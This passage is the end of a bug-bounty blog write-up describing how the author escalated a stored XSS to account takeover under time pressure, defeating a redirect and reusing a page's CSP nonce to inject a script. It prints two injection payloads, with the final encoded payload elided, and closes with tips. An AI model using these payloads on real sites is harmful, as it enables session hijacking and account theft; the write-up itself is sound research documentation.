</span></span></code></pre></div><p>And...it didn't work. That's when I remembered something I overlooked...</p><h2 id=final-step-that-pesky-redirect>Final Step: That pesky redirect</h2><p>Remember that the inline script where we are injecting started by redirecting the window by setting the <code>location.href</code> attribute. This causes the browser to start navigating, at which point it may / may not complete execution of any further inline script and it <em>certainly</em> will not wait for async <code>Promise</code>s to complete such as an XHR or <code>fetch</code>. What I was seeing was that my encoded payload <em>was</em> working but the browser would immediately navigate away from the page and the whole thing didn't get the chance to complete.</p><p>Also remember that the redirect has to start with a legitimate hostname, so there was no chance of providing an invalid redirect which the browser would not navigate to.</p><p>At this stage I started to panic a little bit, I had about 30 minutes before submissions closed and I knew that I was within reach of an escalation. I trolled the Javascript reference about the behavior of <code>location.href</code> when set, and I saw the little gem <code>window.stop()</code> which is documented as "aborts browser naviagtion". This looked like my answer, so I added a call immediately after the end of the URL string as so:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=ln>1</span><span class=cl><span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>hackerone</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=s1>&#39;;window.stop();s=document.createElement(&#39;</span><span class=n>script</span><span class=s1>&#39;);s.nonce=document.getElementsByTagName(&#39;</span><span class=n>script</span><span class=s1>&#39;).item(1).nonce;s.innerText=&lt;very_long_encoded_payload&gt;;document.head.appendChild(s);;//&#39;</span>
</span></span></code></pre></div><p>Good news: this had the intended effect of stopping the redirect!</p><p>Really really bad news: this also stopped any outstanding <code>fetch</code> or <code>XHR</code> request with no easy way to recover.</p><p>Although it probably would have been possible to write some clever code to deal with this problem, I now only had 20 minutes left and needed a solution fast!</p><p>At this point I wondered if I set <code>location.href</code> <em>again</em> to something else, if that 2nd assignment would override the first navigation if it was fast enough. At first I tried with a <code>javascript:</code> URL (this would have been too easy), and finally discovered that the URL <code>foo://a</code> would make the browser behave exactly as I hoped:</p><ul><li>Stop the navigation to the legit URL</li><li>Generate an error (not important)</li><li>Allow further XHR/<code>fetch</code> requests to proceed</li></ul><p>At this point, with only 15 minutes until submissions closed, I had my final payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=ln>1</span><span class=cl><span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>hackerone</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=s1>&#39;;location.href=&#39;</span><span class=n>foo</span><span class=p>:</span><span class=o>//</span><span class=n>a</span><span class=s1>&#39;;s=document.createElement(&#39;</span><span class=n>script</span><span class=s1>&#39;);s.nonce=document.getElementsByTagName(&#39;</span><span class=n>script</span><span class=s1>&#39;).item(1).nonce;s.innerText=&lt;very_long_encoded_payload&gt;;document.head.appendChild(s);;//&#39;</span>
</span></span></code></pre></div><p>I submitted the payload along with evidence of the successful stored XSS to ATO with literally minutes to spare, and having spent almost 6 straight hours on this escalation chain.</p><p>The customer accepted this escalation and was very surprised that this was possible with all the protections in place.</p><h2 id=conclusion>Conclusion</h2><p>A few final wrap-up tips:</p><ul><li>Being familiar with Javascript language and syntax can be really helpful when out-of-the-box payloads don't work. The MDN reference material is hugely helpful in this regard.</li><li>Being familiar with the language will also help you better work around major blockers such as special characters.</li><li>Under time pressure, it is very important to know when you are on a dead-end and backtrack to try a new approach - I did this several times during this exercise.</li><li>Knowing how to write simple text processing scripts will save a ton of time if weird encoding is required.</li></ul><p>I am sure that there are other ways this problem could have been solved, but I thought the journey to a solution and the thought process (and failures!) at the different stages might be interesting to readers</p></div><div class=post_comments></div></article><aside class=sidebar><section class=sidebar_inner><br><div class=search><input type=search class="search_field form_field" placeholder=Search... id=find autocomplete=off data-scope=post>
<label for=find class=search_label><svg class="icon"><title>search</title><use xlink:href="#search"/></svg></label><div class="search_results results"></div></div><div class=sidebardisclaimer><h2 class=mt-4>Disclaimer</h2>The opinions expressed on this site are my own personal opinions and do not represent my employer’s view in any way. All content on this site should be used for legal, research purposes only on assets you are permitted to test. The author expressly disclaims any and all liability from misuse of material on this site.</div><h2 class=mt-4>Featured Posts</h2><ul><li><a href=https://www.pmnh.site/post/howto-hackvertor-request-resigning/ class=nav-link title="Howto: Use Burp Hackvertor Plugin to Re-sign Requests">Howto: Use Burp Hackvertor Plugin to Re-sign Requests</a></li><li><a href=https://www.pmnh.site/post/writeup_spring_el_waf_bypass/ class=nav-link title="Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass">Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass</a></li><li><a href=https://www.pmnh.site/post/2022-sep-2-years-bug-bounty/ class=nav-link title="Reflecting on 2 Years of Bug Bounty">Reflecting on 2 Years of Bug Bounty</a></li></ul><h2 class=mt-4>Recent Posts</h2><ul class=flex-column><li><a href=https://www.pmnh.site/post/howto-hackvertor-request-resigning/ class=nav-link title="Howto: Use Burp Hackvertor Plugin to Re-sign Requests">Howto: Use Burp Hackvertor Plugin to Re-sign Requests</a></li><li><a href=https://www.pmnh.site/post/ctf-deadsec-2023-trailblazer/ class=nav-link title="CTF Writeup: 2023 DeadSec CTF: Trailblazer">CTF Writeup: 2023 DeadSec CTF: Trailblazer</a></li><li><a href=https://www.pmnh.site/post/writeup_spring_el_waf_bypass/ class=nav-link title="Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass">Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass</a></li><li><a href=https://www.pmnh.site/post/2022-sep-2-years-bug-bounty/ class=nav-link title="Reflecting on 2 Years of Bug Bounty">Reflecting on 2 Years of Bug Bounty</a></li><li><a href=https://www.pmnh.site/post/ctf-htb-cyber-apolcalypse-web-genesis-wallet/ class=nav-link title="CTF Writeup: 2022 HTB Cyber Apolcalypse Web Challenge: Genesis Wallet">CTF Writeup: 2022 HTB Cyber Apolcalypse Web Challenge: Genesis Wallet</a></li><li><a href=https://www.pmnh.site/post/cve-luxcal-2021/ class=nav-link title="LuxCal 5.1.x and below Authentication Bypass: CVE-2021-45914, CVE-2021-45915">LuxCal 5.1.x and below Authentication Bypass: CVE-2021-45914, CVE-2021-45915</a></li><li><a href=https://www.pmnh.site/post/advanced-sqlmap-case-study-1/ class=nav-link title="Advanced sqlmap Case Study">Advanced sqlmap Case Study</a></li></ul><div><h2 class="mt-4 taxonomy" id=tags-section>Tags</h2><nav class=tags_nav><a href=https://www.pmnh.site/tags/ctf/ class="post_tag button button_translucent" title=ctf>CTF
<span class=button_tally>2</span>
</a><a href=https://www.pmnh.site/tags/rce/ class="post_tag button button_translucent" title=rce>RCE
<span class=button_tally>2</span>
</a><a href=https://www.pmnh.site/tags/writeup/ class="post_tag button button_translucent" title=writeup>WRITEUP
<span class=button_tally>2</span></a><br><div class="post_tags_toggle button">All Tags</div><div class=post_tags><div class=tags_list><a href=https://www.pmnh.site/tags/advanced/ class="post_tag button button_translucent" data-position=1 title=advanced>ADVANCED<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/authentication/ class="post_tag button button_translucent" data-position=1 title=authentication>AUTHENTICATION<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/bugcrowd/ class="post_tag button button_translucent" data-position=1 title=bugcrowd>BUGCROWD<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/burp/ class="post_tag button button_translucent" data-position=1 title=burp>BURP<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/csrf/ class="post_tag button button_translucent" data-position=1 title=csrf>CSRF<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/ctf/ class="post_tag button button_translucent" data-position=2 title=ctf>CTF<span class=button_tally>2</span>
</a><a href=https://www.pmnh.site/tags/cve/ class="post_tag button button_translucent" data-position=1 title=cve>CVE<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/graphql/ class="post_tag button button_translucent" data-position=1 title=graphql>GRAPHQL<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/hackerone/ class="post_tag button button_translucent" data-position=1 title=hackerone>HACKERONE<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/hackvertor/ class="post_tag button button_translucent" data-position=1 title=hackvertor>HACKVERTOR<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/howto/ class="post_tag button button_translucent" data-position=1 title=howto>HOWTO<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/index/ class="post_tag button button_translucent" data-position=1 title=index>INDEX<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/learning/ class="post_tag button button_translucent" data-position=1 title=learning>LEARNING<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/nodejs/ class="post_tag button button_translucent" data-position=1 title=nodejs>NODEJS<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/python/ class="post_tag button button_translucent" data-position=1 title=python>PYTHON<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/rce/ class="post_tag button button_translucent" data-position=2 title=rce>RCE<span class=button_tally>2</span>
</a><a href=https://www.pmnh.site/tags/sqli/ class="post_tag button button_translucent" data-position=1 title=sqli>SQLI<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/sqlmap/ class="post_tag button button_translucent" data-position=1 title=sqlmap>SQLMAP<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/tutorial/ class="post_tag button button_translucent" data-position=1 title=tutorial>TUTORIAL<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/varnish/ class="post_tag button button_translucent" data-position=1 title=varnish>VARNISH<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/waf/ class="post_tag button button_translucent" data-position=1 title=waf>WAF<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/web/ class="post_tag button button_translucent" data-position=1 title=web>WEB<span class=button_tally>1</span>
</a><a href=https://www.pmnh.site/tags/writeup/ class="post_tag button button_translucent" data-position=2 title=writeup>WRITEUP<span class=button_tally>2</span>
</a><a href=https://www.pmnh.site/tags/xss/ class="post_tag button button_translucent" data-position=1 title=xss>XSS<span class=button_tally>1</span></a><div class=tags_sort><span title="sort alphabetically">[A~Z]</span><span title="sort by count">[0~9]</span></div><span class=tags_hide><svg class="icon"><use xlink:href="#closeme"/></svg></span></div></div></nav></div></section></aside></div></main><svg width="0" height="0" class="hidden"><symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="facebook"><path d="M437 0H75C33.648.0.0 33.648.0 75v362c0 41.352 33.648 75 75 75h151V331h-60v-90h60v-61c0-49.629 40.371-90 90-90h91v90h-91v61h91l-15 90h-76v181h121c41.352.0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zm0 0"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18.001 18.001" id="twitter"><path d="M15.891 4.013c.808-.496 1.343-1.173 1.605-2.034a8.68 8.68.0 01-2.351.861c-.703-.756-1.593-1.14-2.66-1.14-1.043.0-1.924.366-2.643 1.078A3.56 3.56.0 008.766 5.383c0 .309.039.585.117.819-3.076-.105-5.622-1.381-7.628-3.837-.34.601-.51 1.213-.51 1.846.0 1.301.549 2.332 1.645 3.089-.625-.053-1.176-.211-1.645-.47.0.929.273 1.705.82 2.388a3.623 3.623.0 002.115 1.291c-.312.08-.641.118-.979.118-.312.0-.533-.026-.664-.083.23.757.664 1.371 1.291 1.841a3.652 3.652.0 002.152.743C4.148 14.173 2.625 14.69.902 14.69c-.422.0-.721-.006-.902-.038 1.697 1.102 3.586 1.649 5.676 1.649 2.139.0 4.029-.542 5.674-1.626 1.645-1.078 2.859-2.408 3.639-3.974a10.77 10.77.0 001.172-4.892v-.468a7.788 7.788.0 001.84-1.921 8.142 8.142.0 01-2.11.593z"/></symbol><symbol aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="mail"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V4e2c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5.0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="calendar"><path d="M452 40h-24V0h-40v40H124V0H84v40H60C26.916 40 0 66.916.0 1e2v352c0 33.084 26.916 60 60 60h392c33.084.0 60-26.916 60-60V1e2c0-33.084-26.916-60-60-60zm20 412c0 11.028-8.972 20-20 20H60c-11.028.0-20-8.972-20-20V188h432v264zm0-304H40v-48c0-11.028 8.972-20 20-20h24v40h40V80h264v40h40V80h24c11.028.0 20 8.972 20 20v48z"/><path d="M76 230h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zM76 310h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zM76 390h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zm80-80h40v40h-40z"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="github"><path d="M255.968 5.329C114.624 5.329.0 120.401.0 262.353c0 113.536 73.344 209.856 175.104 243.872 12.8 2.368 17.472-5.568 17.472-12.384.0-6.112-.224-22.272-.352-43.712-71.2 15.52-86.24-34.464-86.24-34.464-11.616-29.696-28.416-37.6-28.416-37.6-23.264-15.936 1.728-15.616 1.728-15.616 25.696 1.824 39.2 26.496 39.2 26.496 22.848 39.264 59.936 27.936 74.528 21.344 2.304-16.608 8.928-27.936 16.256-34.368-56.832-6.496-116.608-28.544-116.608-127.008.0-28.064 9.984-51.008 26.368-68.992-2.656-6.496-11.424-32.64 2.496-68 0 0 21.504-6.912 70.4 26.336 20.416-5.696 42.304-8.544 64.096-8.64 21.728.128 43.648 2.944 64.096 8.672 48.864-33.248 70.336-26.336 70.336-26.336 13.952 35.392 5.184 61.504 2.56 68 16.416 17.984 26.304 40.928 26.304 68.992.0 98.72-59.84 120.448-116.864 126.816 9.184 7.936 17.376 23.616 17.376 47.584.0 34.368-.32 62.08-.32 70.496.0 6.88 4.608 14.88 17.6 12.352C438.72 472.145 512 375.857 512 262.353 512 120.401 397.376 5.329 255.968 5.329z"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 212 212" id="gitlab"><path d="M12.3 74.7h54L43.3 3c-1-3.6-6.4-3.6-7.6.0L12.3 74.8z"/><path d="M12.3 74.7.5 111c-1 3.2.0 6.8 3 8.8l101.6 74-92.5-119z"/><path d="M105 193.7l-38.6-119h-54l92.7 119z"/><path d="M105 193.7l38.7-119H66.4l38.7 119z"/><path d="M105 193.7l38.7-119H198l-93 119z"/><path d="M198 74.7l11.6 36.2c1 3 0 6.6-3 8.6l-101.5 74 93-119z"/><path d="M198 74.7h-54.3L167 3c1.2-3.6 6.4-3.6 7.6.0L198 74.8z"/></symbol><symbol viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="rss"><circle cx="3.429" cy="20.571" r="3.429"/><path d="M11.429 24h4.57C15.999 15.179 8.821 8.001.0 8v4.572c6.302.001 11.429 5.126 11.429 11.428z"/><path d="M24 24C24 10.766 13.234.0.0.0v4.571c10.714.0 19.43 8.714 19.43 19.429z"/></symbol><symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="linkedin"><path d="M437 0H75C33.648.0.0 33.648.0 75v362c0 41.352 33.648 75 75 75h362c41.352.0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zM181 406h-60V196h60zm0-240h-60v-60h60zm210 240h-60V286c0-16.54-13.46-30-30-30s-30 13.46-30 30v120h-60V196h60v11.309C286.719 202.422 296.93 196 316 196c40.691.043 75 36.547 75 79.688zm0 0"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 612 612" id="to-top"><path d="M604.501 440.509 325.398 134.956c-5.331-5.357-12.423-7.627-19.386-7.27-6.989-.357-14.056 1.913-19.387 7.27L7.499 440.509c-9.999 10.024-9.999 26.298.0 36.323s26.223 10.024 36.222.0l262.293-287.164L568.28 476.832c9.999 10.024 26.222 10.024 36.221.0 9.999-10.023 9.999-26.298.0-36.323z"/></symbol><symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="carly"><path d="M504.971 239.029 448 182.059V84c0-46.317-37.682-84-84-84h-44c-13.255.0-24 10.745-24 24s10.745 24 24 24h44c19.851.0 36 16.149 36 36v108c0 6.365 2.529 12.47 7.029 16.971L454.059 256l-47.029 47.029A24.002 24.002.0 004e2 320v108c0 19.851-16.149 36-36 36h-44c-13.255.0-24 10.745-24 24s10.745 24 24 24h44c46.318.0 84-37.683 84-84v-98.059l56.971-56.971c9.372-9.372 9.372-24.568.0-33.941zM112 192V84c0-19.851 16.149-36 36-36h44c13.255.0 24-10.745 24-24S205.255.0 192 0h-44c-46.318.0-84 37.683-84 84v98.059l-56.971 56.97c-9.373 9.373-9.373 24.568.0 33.941L64 329.941V428c0 46.317 37.682 84 84 84h44c13.255.0 24-10.745 24-24s-10.745-24-24-24h-44c-19.851.0-36-16.149-36-36V320c0-6.365-2.529-12.47-7.029-16.971L57.941 256l47.029-47.029A24.002 24.002.0 00112 192z"/></symbol><symbol viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="copy"><path d="M23 2.75A2.75 2.75.0 0020.25.0H8.75A2.75 2.75.0 006 2.75v13.5A2.75 2.75.0 008.75 19h11.5A2.75 2.75.0 0023 16.25zM18.25 14.5h-7.5a.75.75.0 010-1.5h7.5a.75.75.0 010 1.5zm0-3h-7.5a.75.75.0 010-1.5h7.5a.75.75.0 010 1.5zm0-3h-7.5a.75.75.0 010-1.5h7.5a.75.75.0 010 1.5z"/><path d="M8.75 20.5A4.255 4.255.0 014.5 16.25V2.75c0-.086.02-.166.025-.25H3.75A2.752 2.752.0 001 5.25v16A2.752 2.752.0 003.75 24h12a2.752 2.752.0 002.75-2.75v-.75z"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512.001 512.001" id="closeme"><path d="M284.286 256.002 506.143 34.144c7.811-7.811 7.811-20.475.0-28.285-7.811-7.81-20.475-7.811-28.285.0L256 227.717 34.143 5.859c-7.811-7.811-20.475-7.811-28.285.0-7.81 7.811-7.811 20.475.0 28.285l221.857 221.857L5.858 477.859c-7.811 7.811-7.811 20.475.0 28.285a19.938 19.938.0 0014.143 5.857 19.94 19.94.0 0014.143-5.857L256 284.287l221.857 221.857c3.905 3.905 9.024 5.857 14.143 5.857s10.237-1.952 14.143-5.857c7.811-7.811 7.811-20.475.0-28.285L284.286 256.002z"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="open-menu"><path d="M492 236H20c-11.046.0-20 8.954-20 20s8.954 20 20 20h472c11.046.0 20-8.954 20-20s-8.954-20-20-20zm0-160H20C8.954 76 0 84.954.0 96s8.954 20 20 20h472c11.046.0 20-8.954 20-20s-8.954-20-20-20zm0 320H20c-11.046.0-20 8.954-20 20s8.954 20 20 20h472c11.046.0 20-8.954 20-20s-8.954-20-20-20z"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="instagram"><path d="M12 2.163c3.204.0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849.0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204.0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849.0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741.0 8.333.014 7.053.072c-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948s.014 3.668.072 4.948c.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24s3.668-.014 4.948-.072c4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948s-.014-3.667-.072-4.947c-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403.0-6.162 2.759-6.162 6.162S8.597 18.163 12 18.163s6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zM12 16c-2.209.0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796.0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795.0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="youtube"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23.0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23.0C23.512 20.55 23.971 18.196 24 12c-.029-6.185-.484-8.549-4.385-8.816zM9 16V8l8 3.993L9 16z"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="stackoverflow"><path d="M21 27v-8h3v11H0V19h3v8h18z"/><path d="M17.1.2 15 1.8l7.9 10.6 2.1-1.6L17.1.2zm3.7 14.7L10.6 6.4l1.7-2 10.2 8.5-1.7 2zM7.2 12.3l12 5.6 1.1-2.4-12-5.6-1.1 2.4zm-1.8 6.8 13.56 1.96.17-2.38-13.26-2.55-.47 2.97zM19 25H5v-3h14v3z"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="xing"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></symbol></svg><footer class=footer><div class="footer_inner wrap pale"><img src=https://www.pmnh.site/icons/apple-touch-icon.png class="icon icon_2 transparent" alt="A developer's notes in the world of security research and bug bounty, by pmnh"><p>Copyright&nbsp;<span class=year></span>&nbsp;A DEVELOPER'S NOTES IN THE WORLD OF SECURITY RESEARCH AND BUG BOUNTY, BY PMNH. All Rights Reserved</p><a class=to_top href=#documentTop><svg class="icon"><title>to-top</title><use xlink:href="#to-top"/></svg></a></div></footer><script type=text/javascript src=https://www.pmnh.site/en/js/bundle.19668860ea177cfe8cad686c7464b57e39acde1a4c33f6a1a8c57f7ab127ac39e8330b38e7184422cf0e9351ef3efaf75d122eca818d38a929941b8a5c04b09e.js integrity="sha512-GWaIYOoXfP6MrWhsdGS1fjms3hpMM/ahqMV/erEnrDnoMws45xhEIs8Ok1HvPvr3XRIuyoGNOKkplBuKXASwng==" crossorigin=anonymous></script><script src=https://www.pmnh.site/js/search.min.c67b7b163db3fff962dd35c570987eb5530974e14af2e6d10731ba8a3e022d25fa9922431dc21f1e112ac6add88bd1a99d7e4c1873ae2e6f2bf71b9f4a7b9c04.js></script></body></html>